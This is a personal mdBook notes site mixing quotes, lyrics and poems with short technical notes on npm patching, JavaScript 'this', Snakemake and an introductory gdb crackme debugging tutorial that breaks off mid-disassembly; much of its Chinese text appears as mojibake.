<!DOCTYPE HTML>
<html lang="zh" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Random Notes</title>
        <meta name="robots" content="noindex" />
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        <!-- MathJax -->
        <script async type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded affix "><a href="index.html">Random Notes</a></li><li class="chapter-item expanded affix "><li class="part-title">Literature</li><li class="chapter-item expanded "><a href="literature/quotes.html"><strong aria-hidden="true">1.</strong> Random Quotes</a></li><li class="chapter-item expanded "><a href="literature/lyrics.html"><strong aria-hidden="true">2.</strong> Lyrics Quotes</a></li><li class="chapter-item expanded "><a href="literature/poems.html"><strong aria-hidden="true">3.</strong> Poem Excerpts</a></li><li class="chapter-item expanded affix "><li class="part-title">Frontend</li><li class="chapter-item expanded "><a href="frontend/fix-node-modules.html"><strong aria-hidden="true">4.</strong> Fix node-modules</a></li><li class="chapter-item expanded "><a href="frontend/use-develop-branch.html"><strong aria-hidden="true">5.</strong> Use develop branch</a></li><li class="chapter-item expanded "><a href="frontend/group-buddy-teach-me-how-to-write-js.html"><strong aria-hidden="true">6.</strong> Frontend from scratch</a></li><li class="chapter-item expanded affix "><li class="part-title">Python</li><li class="chapter-item expanded "><a href="Python/snakemake.html"><strong aria-hidden="true">7.</strong> Snakemake 101</a></li><li class="chapter-item expanded affix "><li class="part-title">Reverse Engineering</li><li class="chapter-item expanded "><a href="RevEng/gdb.html"><strong aria-hidden="true">8.</strong> Intro to gdb</a></li><li class="chapter-item expanded "><a href="RevEng/ascii-asm.html"><strong aria-hidden="true">9.</strong> ASCII shellcode (WIP)</a></li><li class="chapter-item expanded affix "><li class="part-title">DevOps</li><li class="chapter-item expanded "><a href="devops/hadoop-on-k8s.html"><strong aria-hidden="true">10.</strong> Haddop in K8S</a></li><li class="chapter-item expanded "><a href="devops/aws-amplify.html"><strong aria-hidden="true">11.</strong> AWS Amplify Attempts</a></li><li class="chapter-item expanded affix "><li class="part-title">Linux</li><li class="chapter-item expanded "><a href="Linux/disk-management.html"><strong aria-hidden="true">12.</strong> Disk Management</a></li><li class="chapter-item expanded "><a href="Linux/net-forwarding.html"><strong aria-hidden="true">13.</strong> Internet Sharing</a></li><li class="chapter-item expanded "><a href="Linux/ssh_config.html"><strong aria-hidden="true">14.</strong> ssh config tips</a></li><li class="chapter-item expanded affix "><li class="part-title">Terminal Usage</li><li class="chapter-item expanded "><a href="Terminal/effective-shell.html"><strong aria-hidden="true">15.</strong> Effective Shell 1</a></li><li class="chapter-item expanded "><a href="Terminal/random-bash-tips.html"><strong aria-hidden="true">16.</strong> Random bash tips</a></li><li class="chapter-item expanded "><a href="Terminal/tmux.html"><strong aria-hidden="true">17.</strong> TMUX 101</a></li><li class="chapter-item expanded affix "><li class="part-title">LaTeX</li><li class="chapter-item expanded "><a href="latex/general-latex-tricks.html"><strong aria-hidden="true">18.</strong> General LaTeX tricks</a></li><li class="chapter-item expanded affix "><li class="part-title">Misc</li><li class="chapter-item expanded "><a href="misc/use-wsl-with-gui.html"><strong aria-hidden="true">19.</strong> Use WSL with GUI</a></li><li class="chapter-item expanded "><a href="misc/gpg.html"><strong aria-hidden="true">20.</strong> GPG</a></li><li class="chapter-item expanded "><a href="misc/sukhoi-fighters.html"><strong aria-hidden="true">21.</strong> Flankerology 101</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Random Notes</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="random-notes"><a class="header" href="#random-notes">Random Notes</a></h1>
<p>æ‚ä¸ƒæ‚å…«ç»™è‡ªå·±çœ‹çš„ç¬”è®°</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="random-quotes"><a class="header" href="#random-quotes">Random Quotes</a></h1>
<blockquote>
<p>The word God is for me nothing more than the expression and product of human weaknesses, the Bible a collection of honorable, but still primitive, legends which are nevertheless pretty childish.
<span style="float:right">â€”â€” Albert Einstein</span><br>
â€œä¸Šå¸â€ è¿™ä¸ªè¯å¯¹æˆ‘æ¥è¯´æ— éå°±æ˜¯äººç±»è‡ªèº«å¼±ç‚¹çš„ä¸€ç§è¡¨è¾¾æ–¹å¼å’Œäº§ç‰©ï¼Œã€Šåœ£ç»ã€‹ åˆ™æ˜¯ä¸€æœ¬å…‰è£çš„ä¼ å¥‡æ•…äº‹çš„åˆè¾‘ï¼Œä½†ä¾æ—§éå¸¸åŸå§‹çš„ã€åŒæ—¶ä¹Ÿæ˜¯æä¸ºå¹¼ç¨šçš„ã€‚
<span style="float:right">â€”â€” çˆ±å› æ–¯å¦</span></p>
</blockquote>
<blockquote>
<p>æˆ‘å¹´è½»æ—¶ï¼Œæ¯”ç°åœ¨è¿˜æ— çŸ¥ï¼Œå®¹æ˜“æ­£ä¹‰æ„Ÿçˆ†æ£šï¼Œè‡³å°‘ç°åœ¨æ…¢æ…¢æ˜ç™½ï¼Œæ­£ä¹‰åº”è¯¥æ˜¯å—è„‘å­é‡Œå†·é™çš„åšå†°ï¼Œåƒä¸‡åˆ«åŠ¨ä¸åŠ¨å°±è„‘å­å‘çƒ­ï¼Œé‚£å®¹æ˜“è¿›æ°´ã€‚
<span style="float:right">â€”â€” ä½œè€…æå¤§çœ¼ï¼ˆææ‰¿é¹ï¼‰, 2010 å¹´ã€Šä¸­å›½è¶³çƒå†…å¹•ã€‹è°ƒæŸ¥èƒŒåçš„è®°è€…</span>
<br><br></p>
</blockquote>
<blockquote>
<p>We think  sometimes that poverty is only being hungry, naked and homeless. The poverty of being unwanted, unloved and uncared for is the greatest poverty.<span style="float:right">â€”â€” Mother Teresa</span><br>
æˆ‘ä»¬ä»¥ä¸ºè´«ç©·å°±æ˜¯é¥¥é¥¿ã€è¡£ä¸è”½ä½“å’Œæ²¡æœ‰æˆ¿å±‹ã€‚ç„¶è€Œæœ€å¤§çš„è´«ç©·å´æ˜¯ä¸è¢«éœ€è¦ã€æ²¡æœ‰çˆ±å’Œä¸è¢«å…³å¿ƒã€‚ <span style="float:right">â€”â€” ç‰¹è•¾èä¿®å¥³</span><br><br></p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="lyrics-quotes"><a class="header" href="#lyrics-quotes">Lyrics Quotes</a></h1>
<h2 id="defect--ç¼ºé™·"><a class="header" href="#defect--ç¼ºé™·">Defect / ç¼ºé™·</a></h2>
<p>DoubleMirror åŒé¢é•œ</p>
<blockquote>
<p>å€¾è¯‰æ˜¯ä¸€ä¸‹ç¬”<br>
å°±é”™ä½çš„å¹³è¡Œçº¿<br>
ä»¥æåº¦æ¸´æœ›çš„è¯­è¨€<br>
æè¿°ä¸èƒ½æŒä¹…æ‹¥æœ‰çš„æ€€å¿µ</p>
</blockquote>
<h2 id="hurt"><a class="header" href="#hurt">Hurt</a></h2>
<p>Johnny Cash</p>
<p><a href="https://youtu.be/8AHCfZTRGiI">Link to song (YouTube Official Music Video)</a></p>
<blockquote>
<p>I hurt myself today<br>
To see if I still feel<br>
I focus on the pain<br>
The only thing that's real<br><br>
The needle tears a hole<br>
The old familiar sting<br>
Try to kill it all away<br>
But I remember everything<br><br>
What have I become?<br>
My sweetest friend<br>
Everyone I know goes away<br>
In the end<br><br>
And you could have it all<br>
My empire of dirt<br>
I will let you down<br>
I will make you hurt<br><br>
I wear this crown of thorns<br>
Upon my liar's chair<br>
Full of broken thoughts<br>
I cannot repair<br><br>
Beneath the stains of time<br>
The feelings disappear<br>
You are someone else<br>
I'm still right here</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="poetry-excerpts"><a class="header" href="#poetry-excerpts">Poetry Excerpts</a></h1>
<h2 id="had-i-not-seen-the-sun"><a class="header" href="#had-i-not-seen-the-sun">Had I not seen the Sun</a></h2>
<p>Emily Dickinson</p>
<blockquote>
<p>Had I not seen the Sun<br>
I could have borne the shade<br>
But Light a newer Wilderness<br>
My Wilderness has madeâ€”</p>
</blockquote>
<h2 id="ocd"><a class="header" href="#ocd">OCD</a></h2>
<p>Neil Hilborn</p>
<p>æœ¬è¯—è¢«ç”¨ä½œ <a href="https://youtu.be/l63hfdrb_jI">Rous - H.E.R</a> çš„äººå£°é‡‡æ ·</p>
<blockquote>
<p>When she said she loved me her mouth was a straight line,<br>
She told me that I was taking up too much of her time<br>
Last week she started sleeping at her mother's place<br>
She told me that she shouldn't have let me get so attached to her;<br>
that this whole thing was a mistake, but...<br>
How can it be a mistake that i don't have to wash my hands after I touched her?<br>
Love is not a mistake, and it's killing me that she can run away from this and I just can't,<br>
I can't â€” I can't go out and find someone new because I always think of her,<br>
Usually, when I obsess over things, I see germs sneaking into my skin.<br>
I see myself crushed by an endless succession of cars...<br>
And she was the first beautiful thing I ever got stuck on.<br>
I want to wake up every morning, thinking about the way she holds her steering wheel...<br>
How she turns shower knobs like she's opening a safe.<br>
How she blows out candlesâ€”<br>
blows out candlesâ€”<br>
blows out candlesâ€”<br>
blows out candlesâ€”<br>
blows out candlesâ€”<br>
blows out...<br>
Now, I just think about who else is kissing her,<br>
I can't breathe because he only kisses her once â€” he doesn't care if it is perfect<br>
I want her back, so bad...<br>
I leave the door unlocked.<br>
I leave the lights on.<br></p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ä¿®ç†-hexo-douban"><a class="header" href="#ä¿®ç†-hexo-douban">ä¿®ç† hexo-douban</a></h1>
<p>åœ¨æ–°åšå®¢ä½¿ç”¨äº† <a href="https://github.com/mythsman/hexo-douban"><code>hexo-douban</code></a> è¿™ä¸ªåº“ï¼Œæƒ³å±•ç¤ºè‡ªå·±çš„è±†ç“£é˜…è¯»ã€è§‚å½±ç­‰ç­‰ã€‚ä½†æ˜¯ç”Ÿæˆçš„è±†ç“£é¡µåœ¨ Fluid ä¸»é¢˜ä¸‹å›¾ç‰‡æ˜¾ç¤ºæœ‰ç‚¹é—®é¢˜ï¼Œéœ€è¦æ‰‹åŠ¨æ”¹ <code>css</code> æ¥è§£å†³ï¼›åŒæ—¶è£…äº† <code>bluebird</code> åˆæ£€æµ‹åˆ°å‡ å¤„ <code>TypeError</code>ï¼Œéœ€è¦ä¿®æ”¹ <code>js</code> æºç ã€‚
åŸä½œè€…å·²ç»æ²¡æœ‰ç²¾åŠ›ç»´æŠ¤è¿™ä¸ªåº“äº†ï¼Œ<code>npm</code> è‚¯å®šä¸ä¼šæ›´æ–°ï¼Œè€Œæˆ‘åˆä¾èµ– GitHub Actions æ¥éƒ¨ç½²ã€‚å¦‚ä½•åº”ç”¨è‡ªå·±çš„æ‰‹åŠ¨ä¿®æ”¹æ˜¯ä¸ªé—®é¢˜ã€‚</p>
<h2 id="ä½¿ç”¨-patch-package-ç»™åŒ…æ‰“è¡¥ä¸"><a class="header" href="#ä½¿ç”¨-patch-package-ç»™åŒ…æ‰“è¡¥ä¸">ä½¿ç”¨ <code>patch-package</code> ç»™åŒ…æ‰“è¡¥ä¸</a></h2>
<p>è¿™é‡Œæ¨èä¸ªå°å·¥å…· <a href="https://www.npmjs.com/package/patch-package">patch-package</a>ã€‚å°±æ˜¯ç»™ä¾èµ–åº“æ‰“ä¸ªè¡¥ä¸ï¼Œä¸å½±å“ä¾èµ–åº“æ­£å¸¸å‡çº§ï¼Œåªæ˜¯æ¶‰åŠåˆ°ä½ ä¿®æ”¹çš„å†…å®¹ä¼šç”¨ä½ çš„è¡¥ä¸æ›¿æ¢ã€‚</p>
<p>ç›´æ¥åœ¨ä¾èµ–åº“ä¸­ç¼–è¾‘ä¿®å¤æœ‰ bug çš„æ–‡ä»¶ï¼Œç„¶åè¯¥å·¥å…·ä¼šç”Ÿæˆä¸ªä¸´æ—¶æ–‡ä»¶å¤¹å­˜æ”¾å¯¹åº”ç‰ˆæœ¬çš„ä¾èµ–åº“ï¼Œç„¶åå’Œä½ ä¿®æ”¹çš„ä¾èµ–åº“ç›®å½•å»è¿›è¡Œæ¯”è¾ƒï¼Œç”Ÿæˆä¸€ä¸ª patch æ–‡ä»¶ï¼Œä¸‹æ¬¡åœ¨æ‰§è¡Œ <code>npm install</code> æ—¶ï¼Œè¯¥å·¥å…·ä¼šå°†è¯¥ patch åˆè¿›è¯¥ä¾èµ–åº“å»ã€‚</p>
<h2 id="å…·ä½“æ“ä½œæ­¥éª¤"><a class="header" href="#å…·ä½“æ“ä½œæ­¥éª¤">å…·ä½“æ“ä½œæ­¥éª¤</a></h2>
<ol>
<li>
<p>é¡¹ç›®çš„æ ¹ç›®å½• <code>package.json</code> ä¸‹ï¼Œæ·»åŠ  <code>npm postinstall</code>, ä»¥ä¾¿æ¯æ¬¡æ‰§è¡Œ <code>npm install</code> æ—¶èƒ½åˆè¿›æ‰€æœ‰çš„patchæ–‡ä»¶ï¼š</p>
<pre><code class="language-diff">&quot;scripts&quot;: {
   ...
+  &quot;postinstall&quot;: &quot;patch-package&quot;
   ...
}
</code></pre>
</li>
<li>
<p>å®‰è£… <code>patch-package</code></p>
<pre><code class="language-bash">npm i patch-package --save
</code></pre>
</li>
<li>
<p>ç¼–è¾‘ä¾èµ–åº“ <code>&lt;package-name&gt;</code>, å¹¶æ‰§è¡Œä¸‹é¢å‘½ä»¤ç”Ÿæˆ patch æ–‡ä»¶</p>
<pre><code class="language-bash">npx patch-package &lt;package-name&gt;
</code></pre>
</li>
<li>
<p>å†æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œä½ å°±å‘ç°æœ€æ–°å®‰è£…çš„åŒ…å·²ç»åˆè¿›äº†ä½ åˆšåˆšä¿®æ”¹çš„ patch æ–‡ä»¶äº†</p>
<pre><code class="language-bash">npm install
</code></pre>
</li>
</ol>
<h2 id="reference"><a class="header" href="#reference">Reference</a></h2>
<ol>
<li><a href="https://juejin.im/post/6844904165328551944">JeanZhao: ä¿®æ”¹node_modulesä¸­ä¾èµ–åº“</a></li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="use-develop-branch-for-a-certain-package"><a class="header" href="#use-develop-branch-for-a-certain-package">Use develop branch for a certain package</a></h1>
<h2 id="npm"><a class="header" href="#npm">npm</a></h2>
<pre><code class="language-shell">npm install --save &lt;author&gt;/&lt;repo&gt;#&lt;branch-name or commit&gt;
</code></pre>
<p>Example:</p>
<pre><code class="language-shell">npm install --save fluid-dev/hexo-theme-fluid#develop
</code></pre>
<h2 id="yarn"><a class="header" href="#yarn">yarn</a></h2>
<pre><code class="language-shell">yarn add &lt;github-repo-url&gt;#&lt;branch-name or commit&gt;
</code></pre>
<p>Example</p>
<pre><code class="language-shell">yarn add https://github.com/fluid-dev/hexo-theme-fluid.git#develop
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ç¾¤å‹æ•™æˆ‘å†™-js"><a class="header" href="#ç¾¤å‹æ•™æˆ‘å†™-js">ç¾¤å‹æ•™æˆ‘å†™ js</a></h1>
<p>å®Œå…¨ä¸æ‡‚å‰ç«¯ç¡¬å†™è¯¾è®¾çš„æ—¶å€™å­¦åˆ°çš„ä¸€æ˜ŸåŠç‚¹å§¿åŠ¿ã€‚</p>
<h2 id="this-in-js"><a class="header" href="#this-in-js"><code>this</code> in js</a></h2>
<p>I defined a <code>class</code> called <code>PictureStore</code> which contains a property <code>rootStore</code> and has a function <code>uploadPicture()</code>. Inside <code>uploadPicture()</code>, I need to access <code>rootStore</code> to retrieve some properties.</p>
<p>At first I defined them in this way:</p>
<pre><code class="language-typescript">class PictureStore {
  rootStore : RootStore;
  ... // omitted
  async uploadPicture() {
    ... // omitted
    let something = this.rootStore.doSomething();
    ... // omitted
  }
  ... // omitted
}
</code></pre>
<p>Unfortunately I received <code>Unhandled TypeError</code>, which claimed that <code>rootStore</code> is <code>undefined</code>.</p>
<p><a href="https://github.com/jokester">Master Bai</a> told me to re-write the definition of <code>uploadPicture()</code> in this way:</p>
<pre><code class="language-typescript">class PictureStore {
rootStore : RootStore;
  ... // omitted
  uploadPicture = async () =&gt; {
    ... // omitted
    let something = this.rootStore.doSomething();
    ... // omitted
  }
  ... // omitted
}
</code></pre>
<p>which fixed the bug nicely.</p>
<p>The reason is that <code>this</code> in js works weirdly (well, in my opinion).</p>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/this">MDN's document about <code>this</code></a> explains nicely about everything related to <code>this</code>. I'll extract the contents related to my bug here:</p>
<p>In strict mode (which is the mode my application uses), if the value of <code>this</code> is not set when entering an execution context, it remains as <code>undefined</code>. However, in arrow functions (to understand it naively, they are functions in the form of <code>var fun = () =&gt; {}</code>), <code>this</code> retains the value of the <strong>enclosing lexical</strong> context's <code>this</code> , that is, the <code>this</code> of arrow functions inside a class will be resolved to the class's <code>this</code>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="snakemake"><a class="header" href="#snakemake">Snakemake</a></h1>
<h2 id="snakefile-æ ¼å¼"><a class="header" href="#snakefile-æ ¼å¼"><code>Snakefile</code> æ ¼å¼</a></h2>
<pre><code class="language-python">rule &lt;rule-name&gt;:
    input:
        input1
        input2
    output:
        output
    run:
    # ...
</code></pre>
<h2 id="æ‰§è¡Œ"><a class="header" href="#æ‰§è¡Œ">æ‰§è¡Œ</a></h2>
<pre><code class="language-shell">$ snakemake &lt;rule-name&gt; --cores &lt;core-num&gt;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="gdb-é€†å‘è°ƒè¯•"><a class="header" href="#gdb-é€†å‘è°ƒè¯•">GDB é€†å‘è°ƒè¯•</a></h1>
<h2 id="å¯åŠ¨"><a class="header" href="#å¯åŠ¨">å¯åŠ¨</a></h2>
<p>å¯ä»¥ç›´æ¥æ§åˆ¶å°è¾“å…¥ <code>gdb</code> å¹¶åœ¨ GDB ä¸­æŒ‡å®šç¨‹åºï¼ˆä¾‹ä¸º <code>crackme</code>ï¼‰ã€‚</p>
<pre><code class="language-diff">$ gdb
+ (gdb)
GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
and &quot;show warranty&quot; for details.
This GDB was configured as &quot;x86_64-linux-gnu&quot;.
Type &quot;show configuration&quot; for configuration details.
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
For help, type &quot;help&quot;.
Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.
+ (gdb) file crackme
Reading symbols from crackme...done.
</code></pre>
<p>æˆ–è€…ä¹Ÿå¯ä»¥ç›´æ¥æŒ‡å®šç¨‹åºï¼ˆå‡å®š <code>crackme</code> åœ¨å½“å‰ç›®å½•ä¸‹ï¼‰ã€‚</p>
<pre><code class="language-bash">$ gdb ./crackme
</code></pre>
<p>æˆ–è€…ä¹Ÿå¯ä»¥æŠŠ GDB attach åˆ°æ­£åœ¨è¿è¡Œçš„ç¨‹å¼ä¸Šï¼Œè¿™å¯¹äºæŸäº›æ£€æŸ¥æ˜¯å¦å¤„äº debugger ç¯å¢ƒä¸­çš„ç¨‹å¼æ¯”è¾ƒæœ‰ç”¨ã€‚ä»¥ä¸‹ä¸‰ç§æ–¹å¼éƒ½å¯ä»¥å®ç° attachã€‚</p>
<pre><code class="language-diff">$ gdb -p pid
$ gdb progName pid

$ gdb progName
(gdb) attach pid
</code></pre>
<h2 id="è¿è¡Œç¨‹åºå’Œæ–­ç‚¹"><a class="header" href="#è¿è¡Œç¨‹åºå’Œæ–­ç‚¹">è¿è¡Œç¨‹åºå’Œæ–­ç‚¹</a></h2>
<h3 id="ç¯å¢ƒå˜é‡"><a class="header" href="#ç¯å¢ƒå˜é‡">ç¯å¢ƒå˜é‡</a></h3>
<p>å¯ä»¥ä½¿ç”¨ <code>show env</code> æŸ¥çœ‹ç¯å¢ƒå˜é‡è®¯æ¯ã€‚</p>
<pre><code class="language-bash">(gdb) show env
</code></pre>
<p>è®¾ç½®ç¯å¢ƒå˜é‡åˆ™å¯ä»¥ç”¨ <code>set env ENV=value</code>ï¼Œæ¯”å¦‚ä¸‹é¢æ·»åŠ äº†ä¸€ä¸ªç¯å¢ƒå˜é‡ <code>FOO</code>ï¼Œå€¼ä¸º <code>bar</code>ã€‚</p>
<pre><code class="language-bash">(gdb) set env FOO = bar
</code></pre>
<p>gdb å†…éƒ¨ä¼šé»˜è®¤è®¾ç½®ä¸¤ä¸ªç¯å¢ƒå˜é‡ <code>LINES</code> å’Œ <code>COLUMNS</code>ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œç¯å¢ƒå˜é‡æ˜¯æ”¾åœ¨æ ˆåº•ï¼ˆå¤§åœ°å€ï¼‰çš„ï¼Œå¢åŠ ç¯å¢ƒå˜é‡ä¼šå½±å“æ ˆå¸§åœ°å€çš„æ„æˆã€‚å¦‚æœå¸Œæœ›èƒ½å‡å°‘è¿™ç§å½±å“ï¼Œå¯ä»¥ç”¨ <code>unset</code> åˆ é™¤ç¯å¢ƒå˜é‡ã€‚</p>
<pre><code class="language-bash">(gdb) unset env LINES
(gdb) unset env COLUMNS
</code></pre>
<h3 id="è¿è¡Œç¨‹åº"><a class="header" href="#è¿è¡Œç¨‹åº">è¿è¡Œç¨‹åº</a></h3>
<p>æŒ‡å®šç¨‹åºåå¹¶ä¸ä¼šç›´æ¥è¿è¡Œï¼Œéœ€è¦ä½¿ç”¨ <code>run</code> æˆ–è€…ç¼©å†™ <code>r</code>ã€‚</p>
<pre><code class="language-bash">(gdb) r
</code></pre>
<p>éœ€è¦ä¼ å‚çš„è¯å¯ä»¥åœ¨ <code>run</code> ä¹‹å‰ <code>set args</code></p>
<pre><code class="language-bash">(gdb) set args inputfile.txt
(gdb) r
</code></pre>
<p>æˆ–è€…ç›´æ¥ <code>r args</code></p>
<pre><code class="language-bash">(gdb) r inputfile.txt
</code></pre>
<p>è¿è¡Œå‘½ä»¤ä¹Ÿæ˜¯å¯ä»¥çš„å•¦ã€‚</p>
<pre><code class="language-bash">(gdb) r $(echo &quot;hello!&quot;)
</code></pre>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>start</code> æˆ– <code>starti</code> æ¥è¿è¡Œç¨‹åºï¼Œæœ¬è´¨ä¸Šæ˜¯åœ¨ <code>main</code> ï¼ˆå¦‚æœæ˜¯ C æˆ–è€… C++ ç¨‹åºâ€¦â€¦æœ‰äººç”¨ gdb debug å…¶ä»–è¯­è¨€å—ï¼Ÿï¼‰å¤„è®¾ç½®ä¸€ä¸´æ—¶æ–­ç‚¹åæ‰§è¡Œ <code>run</code>ã€‚æ‰€æœ‰ä¼ ç»™ <code>start</code> çš„å‚æ•°éƒ½ä¼š verbatim åœ°è½¬é€’ç»™ <code>run</code>ã€‚</p>
<p><code>starti</code> ä¸ <code>start</code> çš„åŒºåˆ«æ˜¯å¦‚æœ <code>main</code> å‡½æ•°å­˜åœ¨ elaboration phase ï¼ˆæ¯”å¦‚ C++ é‡Œå…¨å±€å˜é‡çš„å»ºæ„å‡½æ•°æ‰§è¡Œï¼‰ï¼Œ<code>starti</code> å°†ä¼šåœ¨ elaboration phase çš„å¼€å¤´æ‰“ä¸´æ—¶æ–­ç‚¹ã€‚</p>
<h3 id="æ–­ç‚¹"><a class="header" href="#æ–­ç‚¹">æ–­ç‚¹</a></h3>
<p>åœ¨ç¨‹åºè¿è¡Œå‰å’Œè¿è¡Œä¸­å¯ä»¥ç”¨ <code>break</code> æˆ– <code>b</code> æŒ‡å®šæ–­ç‚¹ï¼ˆbreakpointï¼‰ï¼Œå¯ä»¥ä½¿ç”¨å‡½æ•°åï¼Œè¡Œå·ï¼ˆé€†å‘çš„è¯é€šå¸¸ä¸çŸ¥é“ï¼‰å’ŒæŒ‡ä»¤åœ°å€ã€‚</p>
<p>ä½¿ç”¨å‡½æ•°åæ–­ç‚¹ï¼š</p>
<pre><code class="language-bash">(gdb) b main
</code></pre>
<p>ä½¿ç”¨è¡Œå·æ–­ç‚¹ï¼š</p>
<pre><code class="language-bash">(gdb) b 9
</code></pre>
<p>ä½¿ç”¨æŒ‡ä»¤åœ°å€æ–­ç‚¹ï¼ˆæ ¹æ®æ±‡ç¼–ï¼‰ï¼Œæ³¨æ„å› ä¸ºæ˜¯åœ°å€æ‰€ä»¥è¦ç”¨ <code>b *address</code> æ ¼å¼ã€‚</p>
<p>è­¬å¦‚åœ¨æ±‡ç¼–ä¸­æ³¨æ„åˆ°æœ‰ <code>strcmp</code> å‡½æ•°è°ƒç”¨ï¼š</p>
<pre><code class="language-diff">(gdb) disas
Dump of assembler code for function main:
    0x080486a3 &lt;+0&gt;:     push   ebp
    ...
    0x080486d1 &lt;+46&gt;:    add    esp,0x8
    0x080486d4 &lt;+49&gt;:    push   0x8048817
    0x080486d9 &lt;+54&gt;:    lea    eax,[ebp-0x10]
    0x080486dc &lt;+57&gt;:    push   eax
